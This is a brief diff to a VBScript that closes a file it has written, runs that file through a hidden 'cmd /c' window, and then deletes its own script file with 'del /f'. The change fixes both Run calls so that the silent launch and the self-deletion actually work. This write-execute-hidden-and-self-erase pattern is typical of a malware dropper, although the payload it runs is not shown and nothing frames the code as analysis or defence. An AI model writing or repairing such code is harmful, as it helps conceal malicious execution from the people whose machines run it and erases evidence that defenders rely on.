@@ -21,7 +21,7 @@ Next
 objFile.Close()
 Set WshShell = CreateObject("WScript.Shell")
 cmd="cmd /c "&file
-WshShell.Run cmd & file, 0, True
+WshShell.Run cmd, 0, True
 Set WshShell = Nothing
 Set objShell = CreateObject("Wscript.Shell")
 strPath = Wscript.ScriptFullName
@@ -29,5 +29,5 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objFile = objFSO.GetFile(strPath)
 Set WshShell = CreateObject("WScript.Shell")
 cmd="cmd /c del /f "&objFile
-WshShell.Run cmd & file, 0, True
+WshShell.Run cmd, 0, True
 Set WshShell = Nothing
